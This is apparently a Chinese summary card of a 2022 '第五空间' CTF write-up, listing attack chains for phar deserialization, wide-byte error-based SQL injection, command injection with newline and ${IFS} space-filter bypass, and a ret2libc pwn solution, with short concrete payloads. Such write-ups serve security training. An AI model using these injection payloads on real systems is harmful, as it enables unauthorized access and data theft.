---
title: "第五空间 2022/Web + Pwn 合集"
category: web
tags: ["第五空间", "web", "upload 类 phar 触发", "GIF89a 头绕过", "__wakeup file_get_contents", "报错注入"]
signals: ["第五空间 2022", "upload 类 phar 触发", "GIF89a 头绕过", "__wakeup file_get_contents", "报错注入", "弱口令爆破", "命令注入", "空格过滤 ${IFS}", "ret2libc", "sqli", "phar", "deserialize", "rce", "flag"]
difficulty: medium
source: "https://www.ctfiot.com/58322.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第五空间 2022/Web + Pwn 合集

> 赛事：第五空间 2022 | 方向：web | 难度：medium

## 一句话总结

phar 反序列化读 /flag + 报错注入 + 命令注入 + ret2libc 三题合集

## 攻击链

1. Web1: phar 反序列化读 /flag
2. upload 类：filename=__construct 设 /flag；__wakeup 读 file_get_contents(filename)
3. phar metadata 存这个对象，phar:// 触发 file_exists 走 __wakeup
4. Web2: 登录框宽字节报错注入 admin%df''^(SUBSTRING(select(user()),1,1)<>0x61)#
5. 爆 user()、database() 等
6. 弱口令 admin admin123
7. 命令注入：127.0.0.1%0acd${IFS}ky*%0als%0atac${IFS}fl*
8. Pwn: 经典 ret2libc
9. 0x400753 pop rdi; ret → puts@GOT → puts@PLT → main
10. 泄 libc 基址 → /bin/sh + system

## 关键 payload

```
$phar->setMetadata(new upload(filename='/flag'))
```

## 经验教训

phar:// 是 file_exists/exif/finfo 等函数都触发的反序列化入口；${IFS} 绕过空格过滤

## 标签

upload 类 phar 触发、GIF89a 头绕过、__wakeup file_get_contents、报错注入、弱口令爆破、命令注入、空格过滤 ${IFS}、ret2libc

## 参考来源

- https://www.ctfiot.com/58322.html
- 原文件：2022“第五空间”网络安全大赛-WriteUp.full.md
